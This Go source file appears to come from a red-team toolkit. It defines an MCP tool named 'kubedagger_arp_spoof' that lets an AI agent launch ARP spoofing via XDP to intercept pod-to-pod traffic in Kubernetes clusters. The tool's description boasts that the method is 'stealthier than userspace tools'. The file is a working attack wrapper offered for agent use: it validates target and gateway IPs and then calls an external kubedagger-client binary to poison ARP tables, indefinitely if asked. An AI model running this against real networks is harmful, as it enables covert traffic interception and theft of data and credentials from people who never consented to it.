package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type ARPSpoofInput struct {
	Action    string `json:"action"`
	TargetIP  string `json:"target_ip,omitempty"`
	GatewayIP string `json:"gateway_ip,omitempty"`
	Interface string `json:"interface,omitempty"`
	Duration  int    `json:"duration,omitempty"`
}

type ARPSpoofTool struct {
	exec executor.Executor
}

func NewARPSpoof(exec executor.Executor) *ARPSpoofTool {
	return &ARPSpoofTool{exec: exec}
}

func (t *ARPSpoofTool) Name() string { return "kubedagger_arp_spoof" }

func (t *ARPSpoofTool) Description() string {
	return "Perform ARP spoofing via XDP to intercept pod-to-pod traffic within the same L2 segment. Injects gratuitous ARP replies at wire speed using XDP, faster and stealthier than userspace tools."
}

func (t *ARPSpoofTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["start", "stop", "status"],
				"description": "ARP spoof action"
			},
			"target_ip": {
				"type": "string",
				"description": "IP address to impersonate traffic for"
			},
			"gateway_ip": {
				"type": "string",
				"description": "Gateway IP to poison"
			},
			"interface": {
				"type": "string",
				"description": "Network interface for ARP injection"
			},
			"duration": {
				"type": "integer",
				"description": "Duration in seconds (0 = indefinite)"
			}
		},
		"required": ["action"]
	}`)
}

func (t *ARPSpoofTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input ARPSpoofInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if input.TargetIP != "" {
		if err := validateIP(input.TargetIP); err != nil {
			return errorResult(err.Error()), nil
		}
	}
	if input.GatewayIP != "" {
		if err := validateIP(input.GatewayIP); err != nil {
			return errorResult(err.Error()), nil
		}
	}
	if err := validateSafeString(input.Interface, "interface"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"arp-spoof", "--action", input.Action}
	if input.TargetIP != "" {
		args = append(args, "--target-ip", input.TargetIP)
	}
	if input.GatewayIP != "" {
		args = append(args, "--gateway-ip", input.GatewayIP)
	}
	if input.Interface != "" {
		args = append(args, "--interface", input.Interface)
	}
	if input.Duration > 0 {
		args = append(args, "--duration", fmt.Sprintf("%d", input.Duration))
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger arp-spoof failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger ARP Spoof: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("ARP spoofing active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
